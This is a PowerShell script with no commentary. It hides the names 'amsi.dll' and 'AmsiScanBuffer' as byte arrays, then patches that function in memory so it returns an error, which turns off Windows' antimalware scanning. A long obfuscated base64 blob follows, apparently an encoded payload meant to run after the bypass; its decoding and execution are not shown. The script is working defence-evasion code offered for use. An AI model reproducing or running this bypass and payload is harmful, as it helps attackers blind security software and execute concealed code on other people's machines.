
$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32
$test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))
$test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
$Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
#0:  31 c0                   xor    eax,eax
#2:  05 78 01 19 7f          add    eax,0x7f190178
#7:  05 df fe ed 00          add    eax,0xedfedf
#c:  c3                      ret 
#for ($i=0; $i -lt $Patch.Length;$i++){$Patch[$i] = $Patch[$i] -0x2}
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)

$enc = [system.Text.Encoding]::UTF8


$EncodedText = "c2B7dmF8ens1XHtjen5wOEZ9dGdlWXpyfHtFZ3p4ZWEfbh8fNTU1NU5WeHF5cGFXfHtxfHtyPTxI
HzU1NTVFdGd0eDU9HzU1NTU1NTU1TkZhZ3x7ckgfNTU1NTU1NTUxVnp4eHR7cTUoNTc3Hx81NTU1
PB81NTU1MXd0ZnAjIXd8e3RnbCg3QUNkRFRUWFRUVFRQVFRUVDo6LVRUWXJUVFRUVFRUVFREVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRyVFRUVFQhc2ByIVRh
VHtbXHdyV0FYJX1DUn1ldmxXYnZ4LHt2eFNhXFJbfXd4IGNxVld8T0ZXbHFCIXJ0QiFyR1AsQVxS
JGNPUkBgUUQlXl9UVFRUVFRUVFRXREdEVFRBVFBRVF8lYVw+LVRUVFRUVFRUVFRaVFRcclRZVEFU
VFRXIVRUVFRcVFRUVFRUVFRQf2JUVFRUclRUVFREVFRUVFRXVFRUVHJUVFRUVHJUVFdUVFRUVFRU
VFRUUFRUVFRUVFRUVFRWVFRUVFRUclRUVFRUVFRUWFREXEBUVFdUVFRXVFRUVFRUUFRUVFBUVFRU
VFRUVFdUVFRUVFRUVFRUVFRUVFRZISJUVFdFVFRUVFRQVFRUWmJTVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFJUVFRUYlRUVFRQWmJUVFpUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFxUVFRWVFRUVFRUVFRUVFRUVFRUVlZUVFRQclRUVFRU
VFRUVFRUVFRUViAlT019JVRUVFRSV2JUVFRUclRUVFRdclRUVFRcVFRUVFRUVFRUVFRUVFRUVFRU
VlRUVFJUYHZ7W2xMYlRUVFpiU1RUVFREVFRUVFRMVFRUVHJUVFRUVFRUVFRUVFRUVFRUVFRXVFRU
V1RZe195d1Isf1RUVFhUVFRUVFJUVFRUVFZUVFRUX3JUVFRUVFRUVFRUVFRUVFRUVFREVFRURHJU
VFRUVFRUVFRUVFRUVFRUVFRUVFFsWmJUVFRUVFRUUHJUVFRUVlRUQFRNVkRUVF5yQlRUVFdUVFRU
UURUVFdyVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUV1hiVHJUdFRUVFRURFRUUEdMXlR9XFReVFBUVFRMUVhiYT5URFRUV1RfY1BU
VFRWfXZkVFRUQVhUWFRcYlRUVFRcVFRXUFZeVFhUVFRMTUJdWEdUVFReVnJcUld4LUZUVFReXlRE
VFRUTHhXeC1BVFRUXl5kXz5URFRUV1ItQFRUVF5TRSFSVkRUVFd7WEBUVFRSVHxyXFRUVFJfeyFX
VFRUUHdtQFRUVHpkZHshfVRUVFBfRiVNX3shclRUVFA6ckx0VFRUUnZtTFRUVHp5clZQVFRUR29T
YlRUVngtTFRUVF5eclR3WFR+VFZiXFRUVFhUVFdQelFUVFRXfUxeWlp+V1RUVEZUcyFDVGJUVFR9
XFdUeiBlUlYhXXZyUFRUXVRnVGJcQnh7JURUVFRQUHJQVn94fkxZfCBsWmJUVHZdX1tUVFdiXld+
VFRUZWNQYlRUVnxAYVBWT2xMYlRUdlZyT1RUVF53bVhUVFR6elJyVFRWfGZRVH1wdHNELVRUVERG
VERwWFRiVFRUfHJ3VFRUXnNEJVRUVERGVGMhQ1xiVFRUR0xBV1dMQVdHXFdTfVxTc31iVFRUekJQ
clxGVG1cUFNsclJUVFRSXSdHb1BEVFRWfVhSXSdHb1BEVFRWfVhdXSdHb1BEVFRWfVhcXSdEQVZH
LH5QYnpzT1dYWVp8fldUVFRCVlR+R1d9XF9QRHJGVn1QXVByZnpXYlRUV39+RFREVFRWVnJTVFRU
UnZtJVRUVHp5UERPY1BiVFRWeC1wVFRUXl9HUF13bVhUVFRlY11iVFRWfEBHVlItQVRUVF53bFRU
VFR6QVFdXyRUVFdiUERtY1xEVFRWfHJ0VFRUXl5WXFRUVGVsf0RUVHZXUFh3bFhUVFR6elJyVFRW
fHJ8VFRUXnZkQFRUXVRHUVItflRUVF5eV3pUVFR6elxyVFRWfVBYd2xQVFRUZWNQYlRUVnteIlRU
V2J3bEBUVFR6ZlBXUFh3bFBUVFRlY1BiVFRWfVhbXm9lbEFEVFR2VnJPVFRUXndtWFRUVHp5WUdU
eHZ4WFRUXVR6UkRUVFZ4LUFUVFRedmdmVFRdVEdRUi19VFRUXndtWFRUVHp6X3JUVFZ9WFtQRCV6
XHJUVFZ9THpfYlRUVntYelRUVF5QRCVHUVItf1RUVF53bH5UVFR6Xld8cmRUVFReJnIteFNyZWxj
YlRUdlZyfFRUVF4mclRSWkddPjo6OnBRRk9sJ0RUVHZWcnxUVFReJnJUZFRQUCVUVFRUVFRUVG1U
UFRUVlxUVFRReFREVFRRYlRUVFdEVFRUUFRUVFRUV0RUVFRFcldUVFEsVERUVFFEVFRUV0BUVFRQ
cFR8cmdUVFReXmZfb1lUVFRWelRXVFRUUFNNWGFUVFReclRcVFRURHpZclRUVnh+TEIhVF9UVFRQ
XlYtVFRUZWVSU2BUVnJUVFdWemB2bX5UVFR0VFxUVFRXVnpwVHxyZ1RUVF5eclRUVFdmYlZUVnpU
VFRUV1RUVFBGcmJUVFReX0ItbVRUVF5zclxUVFREQlN9TEJcUFhSVFRUelRyVFRXfE9jWHJUVFZ4
LW9UVFReVnxhd1d4LSVUVFRecVZmVFRUU2NbRFRUVnxyWVRUVFJWYnZmRHJwWllRIV1RV0xbXm9c
XFZPdkFXV1BQXlR6VFRUT2xUYlBUdlZyJ1RUVF5ZV0xHV10hVlRUVFBTfUxCU3xXUVdyVFReVFxU
VFRMeFZHcUxRRH5cf3h+bGxUT2NbYlRUVnwncSZCbzo6Oi1ScUchVFRUUEFXR1BTWVR2R1dCLSFU
VFReJlRQRFRUVFZUVnpUdGVEVFNUVFRUVFdWQCVlVlREVFdUVFRUVFRUWFRUVFRxf0RgWFYhb1hR
WG1aRFRUVFRUU1RSYlRUVFdQVlRUVFwmIVRUWVRcVFRRLVZEVFRcJFsldnh5YE8mWFRUVFRUZ1dc
VFRWcldUVFR/Q0NYVCRXWFRUV1RUVFRUf0ckQ19HVFRUVFpEQVRUUVBUclRUXCVfZncnXFRUVFRU
VFRUVFRyVFRUQ3ZxVH1iX1RyVFRURXpXWGJUQlRUVFdUVFRUXmJUVFRUdlRUVFR9VFRUVFJyVFRU
UX5UVFRUIVRUVFRTRFRUVFQtVFRUVFBUVFRUV1RUVFRUUFRUVFRcVFRUVFREVFRUVERUVFRUU1RU
VFRUVFFeV1RQVFRUVFRUVExUXkRGf1diTFR5ckZ/V2JMVE1EW0ZXYi1UYmJ2VFRUTFR9RFtdV3JM
VFFUR11XckxUIkRbXVdyTFRzREddV3JMVEZER11XckxUTHJHXVdyTFR7VFtdV3JMVHZEWlBXYkxU
QWJaUFdiTFQlVFtdV3JMVGFiWCJXRExUeERydFdyTFRdclF3VFRMVHhUT3pWRHpUbWJCe1ZUIVR2
RHdkVlRMVHJiTHRXckxUYWJcdFdyTFRQYlh0V3JMVCRycnRXckxUfnJAdFdyTFRfYkx0V3JMVFtU
Wn9XYkxUQGJ+ZFdETFRcVHZnVlRMVFZiXHRXckxUQERQZFdETFRTRH50V3JMVExUQHRXckxUY2JC
UFdiTFRHYnZ0V3JMVERUXHRXciFUelR7ZFZUIVRiRFlkVldcVEZifSZWVHpUT3J9RldielRCRE9G
V2JMVCFEXGdWVHpURnJTRldiVFRUVFRlVFRUVFRUVFdUVFBUVERURFRXXFJEcnlXVFRQVFREVFlU
R1xUfGJUVFRTflRRRFREVFRYV1RUVFRUYlRUTURURlRXVFRUYlBUVF1QXVRUV2VUV1xUU1RUUVRE
VFQsclRUVFMlVFxUVEBUVFh9UFRRTVRUVFRERFRyVFdyVFBEV2BWVmZXWERWflRSLVRATFd2VFFc
V0BMVCBUUVxXQExWbVRRXFdATFZNVFFcV0BMV3tUUVxXQExXI1RRXFdQRFFYVFFAV1BEUUNUUUBX
QExXRFRRQFdATFdQVFFAV1dyUXNXUUBXV3JUfVZCLVRXclclVkFyV1dyVlFWQXJXV3JRLVd4LVRX
cndQVFFAV0N6VjpUQWZXQ3pRT1dBZldDeld2VEFmV0N6VHRXQWZXQ3pXZFRBZldDelR5VG9mV0N6
UVtWQWZXQ3pUR1dBZldDelYjV1FmV0N6VGxUUWZXQ3pRT1R/ZldDelFeVlFmV0N6VFhXQWZXW3JU
eVRRLVdTclRXVFBYV1RUVFRUXFRUeXxUW1RAdldURFRUVFRUVHJUVkdcUSFcQXJQUVRUVFRUVFZU
VF9QcnNyQ09URHpUVFRUVFRcVFR+RlZGVkMhV1ZiVFRUVFRUclRWQlxYRFdPclBaVFRUVFRUVlRU
X1ByVFR9Z1RELVRUVFRUVFxUVH5GUXFXeyFXUlRUVFRUVFRyVFZHXFxMXH5EUH1UU1RyVFRUVFRf
UFRcRHRMVEZYVHBWVFRUVFRUeXJWIlZPIVdfRFZ7XFRUVFRUVkdUUVRXemJQeFRbVHJUVFRUVF9Q
VGZEeGVURnZUOlZUVFRUVFR5clRmV2QlV19iV1xcYlRUVFRWUlJRel1XclR6VFNUf1RUVFRUX1BM
RFRwZVRGclRUVFRUVFRYVH19ciNXbyVUXlRUVFRUVFRUYlFSVHAlV2ZiUGRUVFRUVFRUUVRYTFcj
VFIgVEZiVFRUVFRUVFhUbXJdcFR2WFdYVFRUVFRUVFRiVlJSUXpdRURUbVRUVFRUVFRRVFhMVyJE
XV9UQVhUVFRUVFRUWFRtcl16VHYtV1tEVFRUVFRUVGJRUlRxIVcnRFAgVFxQf1RUVFRUX1BMRFRw
ZVRBelR/RlhUVFRUVH19ciNXYkxUWnJWTFxiVFRUVFZRVFRmVFdyVCNUVFRUVERUIFRyXFRUclR4
VERUVFREVyFURFRUVHJUUldiVFRUYlFUVFRUVFdUUVZUVFRUV0RRRlZEVFRXclFxVkRUVFdiUUZX
YlRUVERXIVREVFRURFchVERUVFRyV3BXRFRUVGJUIVZEVFRURFdaV2JUVFREUVtUclRUVHJUQldi
VFRUYlFGVERUVFdUVm9XclRUV0RReFdUXFRXclFYV3JcVFdiUSZXVFRUVlRWJVdUVFRWRFF9V2JU
VFREUU9XYlRUVHJRVFdyVFRUYlZ4V3JUVFdUVkRUclRUV0RWVFRyVFRXcldMVHJUVFdiVnZUclRU
VlRWb1REVFRWRFZ/VERUVFREUUFWRFRUVHJRJlZEVFRURFchVERUVFRyVFlXclRUVERXIVREVFRU
RFRNVHJUVFREUXtXYlRUVERWclZUVFRUclZWVERUVFREVyFURFRUVHJUWVdyVFRURFchVERUVFRy
VFlXclRUVGJWcldEVFRXVFZyVlRUVFREUX9WVFRUVERWclZUVFRUclZWVERUVFREVyxURFRUVHJU
WVdyVFRURFcsVERUVFRyVFlXclRUVGJWcldEVFRXVFZyVlRUVFREUX9WVH5UWnJ2V1RXUFRacnZS
VFd+VFpydl5UVn5UWnJ2RFRRUFRacnZEVFF+VFpydkRUUFBUWnJ2RFRQflRacnZEVFNQVFpydkRU
U35UWnJ2RFRSUFRacnZDVFJ+VFpydkRUXVBUWnJ2RFRdflRacnZEVFt+VFpydlJUVGJUQlRQflRf
UFRacnZXVF9QVCFUfmNUXFBUQ0RAb1RUYlR+ckxSVFRiVCREfiZUWlBUWnJ2LFRFflRacnFRVEV+
VEJEflJUVFBXLFRTc1RUfld+cn1+VFdQV1xiQ2RUV35Xf0RPY1RfflRacnZSVF9+VHZiXERUX35U
eXJQRFRfflRFVExEVF9+VE9yXG9UVlBXZ0RfbFRfflR8RFBvVF9+VFhETG9UVH5XXHJ9JlRUfld+
cn0tVFRQV0ZUXlFUVn5XWnJwXVRWflciVHBFVFZQV2dEXkNUXFBUWnJ2UlRUYlRacnZSVFd+V1py
dldUUX5XZnJ8dFRRfldPYkJ0VFBQV01UfGdUUFBXX1RebVRQUFdPRHAkVFNQV1lUcCJUWn5UWVR7
VFRTfldXclBjVFR+VyJEe1BUWn5UTWJ7XlRFUFQ+VFxSVFR+VFFUUXJUVH5UUFRReVRUflRTVFFk
VFR+VFJUUWNUVH5UXVRRJVRUflRcVFEgVFRyVFlUUT5UVHJUWFRUUVREclRBVFRcVERyVEBUUXJU
VHJUQ1RReVRUclRCVFE+VFRyVE1UUT5UVHJUTFRRY1RUclRPVFRbVERyVHRUVFFURHJUd1RURlRE
clR2VFRNVERyVHFUVHZURHJUcFRUfVREclRzVFR4VEYhVFZiUXNURiFUUGJRelRGIVRSYlRdVHwh
VFxiVERUfCFUXmJUeFR8IVRYYlR4VHwhVFpiVHhUfCFURGJURFR8IVRGYlRmVHwhVEBiVHhUfCFU
QmJUeFR8IVRMYldQVHwhVHRiV2BUfCFUdmJXIlRgWFRwYlFyVFd6VF5yV19UXyFULERNZ1dEVFIh
VEBwVFRUV1RiVFtURFBUVFRQU1RRIVxURFdSVER2VHNyQFdUUExXVkRWRlZEUFRUVFBZVFhEV1Ry
VFJURCVUVFRyUVRUTFdRYlFxV3JYVFRUUEdUXExcV1RUUHJUVFRURFRUVFRUVFRUVFRUVFRUVFRX
VlZEVFRXVFRUVFRUVFRUVFRUVFRUb3JRWlRUVFRUVFRQVFRUVFRUVFRUVFRUVFRRWlRXelJUVFRU
VFREVFRUVFRUVFRUVFRUVFRYIVQjcnJUVFRUVFdUVFRUVFRUVFRUVFRUVFQkYlZlV0RUVFRUVFFU
VFxUV1RUVlRUQFRUclRSVFRcVFdiVFZUVFRUVFFiPlpDLHNYf3FzWFRULUNSLGJDJ3lgT1IsJkV4
X3NNb1wmTW9UVEFSeW9xUlRtVFFiPlpEVC1BQix+cUJteUVyV0F0UiwmQX5QVEAkcURNJSBFQUAs
QkdEV0FDJCxbRkAgX0FAeXRHRFdBQyQsW0RDfV9BQHl0R0RXQUMkV3NBfixBRkNlU1RTW01AUyxa
QSRbU0F+R1FGUFNaRyV5WkdiV0FDJFdzQX4sRkdDV0VAJXlARkAsWlRQW0ZHQEdDRkMsX0F+T0VU
U1tNQFMsWkEkZUVAfkdTQHJXXEMlIFBNJEdFQFAkRUAkRFRAJHFETSRbXEEkcU1GQCBQQSR2VEJU
V09UXU99d11DeU0kLVRMRFdhdidbY3Z4bWVMclQtRXhYVEAmeW9xUkNhWX5bY3dSbXlMJkdldycg
b1l+cXl3eENsdEJYVEdCICR3Q3Fld3hHY3EmW0R2eCx/VFJxeXFTLF9PVFddT01HTXRCIH53JnFA
dF1feUxCR0R2eCx/T01bb0ZCRFR2XV9jTCdDb3YleX5UUHF5cVNxZXd4R2NxJX19d3hHZk9NW1J3
Jl9AdF1feUxCRFRAXV9jTCdDb3YkR3p2eEN9T1RXV09SRFRAJ31jcSUkZXd4eWF0TWV5T1RXQXRS
LCZBQlMhdEIkZXB4Q35UUn1Nd3hEVHRdcWBPVFdhT01HencnRFRPJ0MlTSRXfXYmWyZ3Jl9+VF1b
eXFTLERMTVtvcScsbE9UV2JMJ1t6QUJTIUBSU292JnFjdnhEVHZdWyNAUlNvdiZxY3Z4RFRGUnl+
T0RXUXckR312J2FbT0IkUnZ4Q3lUUlMkcVJ9RExCW2dMQnF5VFBDYE9QeWBxeCxnT0RXVk9CcWV3
fnlgcXgsZ09EV11PTUdTd3tPZXZ4LGB3QkNgcVNPfXZ4eX1MeG15VFB5UHRNW2J3Jlt9THhteVRd
R3p2eEN9T1B9fXd4R2ZPRFd7T01Hc0FCU2V3eXFld3hHY3ElfX13eEdmT0RXekxCIH53UkBURCcs
YHYnLGZPRFd7T01Hc0FCU390UnlgT0AgfXdCQFR2XVsjR1IsYUxCeWBBeFNhT0RXe09NR3NDTVt5
dn4gfXdCQFR2J0MlTSRDb09NX1pMQiR5VF1Xf0wnfVtMTX1DdidDbEF4U2FPRFdidiZlQ3YnQ2xB
eFNhT0RXYkwnW3pBQlMhR1IsYUxCeWBMQiR5VFNxbHRNR3lBUnlgT0RXQkxCbSRPQ0cgdlJAVEQn
LGBxUkMhcVNHIHZSQFR3eCwlQ01beU9QfXl2eEBUQHhDb3FSLGxPRFdGT0JTfkEnIGZwQFtjd1Jt
eUwmR2V3JyBWTE1beVRQR2V2JldjdidAVEdCICR3Q0d6dnhDfU9QR3l3UkN7TE1HeVRQJCR3XUdl
TCdTb3FQR3l3UkN7TE1HeVRTW3p3JnFadyVTf3FSeSdMTUd5VFBbY3dNV2V3UkNsRydDYE9NX31x
UkN+RE1HJXZ4eXxxTUd5VFBxJHRCR1dxXUdsdEJfJHFSQFRHUkN8cUJxe0xCX2ZPQFMlcV1fZUx7
QyVPRFdRdyckQnRNW2VMeG15RE1HJXZ4eXxxTUd5VFBTb3YnQ2FMeG0gQ1J5JXdSQ1dxXUdsdEJf
JHFSQFRETVtvT0IkfHddeUB2eFN+T0IkfXZ4YVdxXUdsdEJfJHFSQFRDUlNsTydDJUd7X313QkMm
dyZfZ0RNRyV2eHl8cU1HeVRQU292J0NhTHhtIEd4eWZPQ095dntbZXcnIFdxXUdsdEJfJHFSQFRE
TVtvT0IkfHddeVF3JyB4dEJxJHZ4UyV0QixgRE1HJXZ4eXxxTUd5VFBTb3YnQ2FMeG0gR1JDb0wm
X2V2XUdldycgV3FdR2x0Ql8kcVJAVEQnLGF2UnlmTE1HZXcnIEZPQm19cFJTJXRCLGB2JVMlcV1f
ZUx7QyVPRFdXdiZbeXdCX2ZwQ1dsdydHJEwmR1dxXUdsdEJfJHFSQFRETVtvT0IkfHddeVF3Jlcg
dnh5e3RdR1dxXUdsdEJfJHFSQFRETVtvT0IkfHddeVF3JyRiTEIgIERNRyV2eHl8cU1HeVRTXyR3
e0dld0JDUXcnJGJMTUdlTHh5ZnRNRyBETUcldnh5fHFNR3lUUk9BTE1PeVRTW3p3JnFbdEIgWncl
U39xUnknT0RXQXRSU2x2UG1jTyd5YEBdX2N3TVclWXhDIU9EV39MeVtlcHhAVEZCIFdxTUd6RHtD
eE94Q2xAJ3kjT0RXbE9CT0VxTUdXcU1HekR7Q3hPeENsQCd5I09EV1J3Jl9/T0AkZXd4eWF0TWV5
VFAkfXBSeWF0TWV5VFNbZXB4Q0VPcldBcE1bJU9CJWBDUn1sT0JTfnRCIHtUU1sgdiZHeXdGIEZx
QiAldEIkeVl5T3l2e1tldycgZXd4dlRDUixBcV1fZXd4dlR3XVdBcV1fZXd4dlRPJ0MlTSRXbHRC
JH12e3lBTCZfeU9CIE10QkcldFRXXU9NR010QiB+dyZxQE9NfSVBUkNgTyZHelRQU29wQiB/RCdT
ZndSX31MJ2ZUTCdTZndSX31MJ2ZUQF1feXYnQ2BxUlMldEIsYEd7X313QkMmdyZfZ1RQJH12e1t6
TEJiVEF4QyVxJyxsdCVbbE9CR3l3e0dlTEJiVEF4LGx3QlNmVF1Db09NXG9YfCBQd1JiVHcnbXlY
b1xgT1JtZlRdQ29PTVxvWHwgfndSYlRMJl95T11DZVl4R2Z3VFdmQFJTbExCJVRAXV9jTyZffXdE
V0FwTVslT0IlVEMneWBPUiwmR0IgJHdEV1tMQnlgVFJxeXFTLFB3JyR9dEIhVHYnQyVNJUdjd0JT
ZXdyV0FwTVslT0IlYEB4Q3h3UkN/cVJ5Y3dyV0R2eCx/T01bb0NSfWxPQlN+RCcsZndSQ39xUnlj
d3JXRHZ4eWBMJ3liTEJtRXZSQ2xMTUdldycgU3BSW3l2XUdldychVEJ4Q2x3YldRd1JDfXZyV0Fx
XV9ld3hxVnFCeWZPUkNsVFJbfERNQyV0UF8kT3hPeXZyV193flMkcVJ9VnFCT3hPTVxUdlBTJHFS
fVZxQk94T01cVHZ4Q3hBJkMlRE1DJXRQXyRPeE95dnJXUXZ4Q35DQiBETEJbZ0RNQyV0UkNgcVJ5
f0xNR2V3JyBWcUJPeE9NXFR0Ul9hRHhTYHd4Q2xUUn1Nd3hHX3d7W3l2e0dXT3tHeXZyV31xTUd6
R01fbHcmXFRGQENgcUIkeXZ4UyV3JlxURydDJUdCICR3QkNsTE1HY3ZyVGBMJkdjdnJUYEwnWyV3
JlxURkIgJUBdR2xUXVcldnJXQXBNWyVPQiVgR1J5fU8nIGN2JkdlTCZYVE8nQyVNJEd6dnhDfU9d
WFRAJ31jcSRxZXd4R2NxJVtjd0IkfXd4R29UU1sgdiZHeXdGIEZxQiAldEIkeVl+eWBxUkNsdyZX
QU9NXyd0Qlt5dmJXQXBNWyVPQiVgQHtDYHFSeWFPRiBRdyckYnRCbXl2eVt5dntPZUwnQ29UUEd5
THtDe08neWBPJSRjT1JDb1RdQ1J3UlN7dmJXfnElT2ZMQnFvVFJPZkxCcW9UUlNsTyZYVEN4U2Z0
Qkd9cVJDUXZ4Q35PQiAldEJTZnZiV1F2eEN+Q0B5RHZ4LGF2XUdSdyZfTXRCIH53JnFvRCZfeU9S
Q2BxUnl9d11YVEQnLGBxUlNld3tYVEAmeW9xUkNhWX5bY3dSbXlMJkdldycgb1RTW3lxU3Fld3hH
Y3EkV2N2YldBcE1bJU9CJERMTV99d0JDJU9NX29UUHF5cVBbJHZ7X3l3e0dEdngsf09NW29UUyxs
T01bJHddR29UU1sgdiZHeXdGIE10QiB+dyZxb1RQQ2BxQiRNdEIgfncmcW9UUFtjd3hbfXFUV0VM
eGV5TCZEVHcnX2RPQlslVFNbIHYmR3l3RiBaT01EVE8nQyVNJFdsdEIkfXZ7eUFMJl95T0IgXE9C
eXt0XURUQCd9Y3ElR3lPeFMkd11EVEZAU29wQiB/QHhDb3FCbSVUXV95diZDZnFUV0FwTVslT0Il
YEdSeWxPQlsldyZfIEAnQ2xxeHl/T01YYERCW393JkNgcVAkfXd4U3tPQiR5d3tEVEdCICd0TV9j
d3gkeXd7RFR0XXFgT1NXfXZ4Q2BxVFd7T01Hc0QmQ2x2eENgcVRXYEFCUyFEJywkd3tEVEAnfX12
e1dYdydxZXd5V2x3JyRicVRXQHRdX3lMQkdBcVJTbHFUV1t3Jk95QXhDIXFUV0FwTVslT0IlYENS
QyFxVFdidiZlW09NW29MQnF5Q1JDIXFUV2J2JmVRTE1XJXRCLGBDUkMhcVRXXU9NR010QiB+dyZx
QE9NfSVUU1dsdEIgf3RNV313UFtjd3tHeXBdRFRDUixiQyd5YE9SLCZUUHF5cVNHeXBdR3h2eCxh
cSd5YE9SLCZUU1t6dyZ2VEwmclRDUixXdntffXBEV39wRFd7T01Hc0QnU2JMQltlcV1+VHcmV3NH
TVMkTEJtZXFdflRUVFRUVFF5RFRSYlRPRFd9VF1YVE9EVHJUUkBUd3JXJVRSQFR2clRyVF1EVHRU
V3lUVlRUTGJXbFRSQFRPVFd5VFIhVHFUV2VUUlBUd1RXb1RUVEdHVFdjVFIlVExEV2VUUiFUWnJU
clRUVENDRFdBVFBAVEByV1BUUC1UQURXV1RQflRBclRUUEByVEFiV0FUU0RUQXJXV1RQJVRHRFRU
UyRAVHZiV3lUXVxUd3JXfVRSJVRPRFRyVFElVFxUVFRTJFRUTERXb1RdWFRxYldjVF1cVE9UVHJU
USVUXFRUVFNARFR3Yld9VFIlVExEV2VUUiFUXFRULFRWVFRUVFt2VFRUT0NUV2xUXX5UdERXYFRS
dlRcVFdXVFJ2VExEV2VUUiFUVFZ5QVRSLVR3RFd5VF1EVHRUV2VUUiFUT2JUclRTdlRPRFdgVF1E
VFxUV01UXVxUd2JXYFRSdlRUVlNNVFJ+VHdyV35UUi1UcWJXb1RWVFRAYld5VFJYVHFEV2xUUn5U
cVRXIFRUVFRUVFQ+XnBzID4ldCJBXlJbPjpCQ0xfUGZUVERyVERQXFRsVFRUREByVERQR1BERHJU
RFBaV1ZUV1REXFFXYlBcV0dARkdEUExXRlRXVEdYVFdUdldQfn5RXFRUXFRsVFRRckByVFclQVRU
QHJUclB2UlRAclREUEZ2R0BdUXJcR1FXcl9Ucn5GRkdfX1B+flxWVHJGQUQhUFRUUFpRckBUVHIh
WlFyRFRURHJ2VHJMTFdUVFdURCFQXFRQVlFyTFRUYiFaUXIhUVRUVFpXbFRWVEdSVHhEIVNcVFxW
UXIhUFRUUFdUclhUVFQlWFdiTEZxRyVMXUdyXFJXXyBXRFRUUHpWfVRsVFRSVEByVFdeVGVERHJU
V18kVGxUVF1UQFRUclxaUXJYclRUXFxhJmV2Q31+JSFcflxYdy0hQ2QlJ0F/QFBURFRUVFREVlRU
VFRXUFRUVFRUUFdUVFRUVERUV1RUVFdUVFZUVFRQVGJUVFRURFJUVFRUV1RUVFRUVFBXRFRUVFRE
XVRUVFRXVHJUVFRUUFZEVFRUVEReVFRUVFdUZlRUVFRSV31ARkdEUExUckxfVHJMXFRyTFpUYkxH
U1RYUlB9YlFXfV9tV3JUVlZXckRWVHpUV2JcTFJUclxWVHJfV1RUV1ZXcl1UVFhcUldfX1ZURFRU
RFBMUHJUX1ZXVEdRVHJEVkdyX1BXckRWR1RWVldcVFZEXFxSVH5GRkdUXFB+fkRWV19fUFRyUlRU
XFxQfXJcV0RUVlZXclxXVFRXUX1yU1RUUHFSVHJRVFRUV1dEVFdURyVaV0ZUVlR9ckxWRlRQUHhQ
TFJXX3ldVEByVERcRkxEQHJUcnJMVlR+cldXX31SVHJGT0diU1xUUFxQeFBcVERUXFRUVFRUVFRw
VERUV1RTRFZTeXFsTE1XWncnIFNwUlt5dl1HZXcnIEB0XV9jcSZYV1ZUUFRUclRUVFRUVFNEUFRQ
U1t6TE1fYkFSLHt0QiBEdngsYXZdRFRUVEBXVFRUVFRXdldUV19RdyZXIHZ4eXt0XURyYmR+clxR
XGJYQX5UVFZ+V1RWR39YQV95W395f09WJSZaUlBiWUFEIFt/VGFMQkwmT0YlIVpSW3xPUXYgW1JT
eFpBdlRUVGJXVFR2bVl/VGBYViFiVFRXXVREVHRZfiBTQ1BPbExCJHlxJyxsdGxtQk9NX290Qixg
RU1MJVl/VFdUU0RaU1BPbExCJHlxJyxsdCVHZXYmV2ZMTXlaTEIkeVBWIFpHQ0RyR3tffXdCQyZ3
Jl9nXFFEVFRUVFRUW0x2J0VQVFRUVFRUclRUVFxcVFRUVC1aYlRURVclVFRUVFRUVFRUVFRUVFRU
VFRUV1RUVFRUVFRUVFRUVFRUVFRUVFRUV0ZAJUdBbyxyXlIlI3QsQD5XbVhgfiYkYSFFclBUVFRX
UVp5bSVPQiRiTVNbekxNX2JBUix7dEIgRHZ4LGF2XURhd0JTb3FSQ2xNU1t6TE1fYkFSLHt0QiBE
dngsYXZdRGF3QlNvcVJDbE1TW3pMTV9iQVIse3RCIER2eCxhdl1HdncnX2RNU195d1JDfXYnQ3ZA
J319dntXWHcncWV3eVdsdyckYnFWIGJPUlxUIH9mVFRUVFRUVFRUVFRUVFRRYlRUVFRyVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRFXCJUVFRUVFRUVFRUVFRUVFRUTSVbY3Z+QyFPQCR9dEIh
VHdNW393Jl95T0YgfndSYlRUVFRUVFRUVDpsQFRcUFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
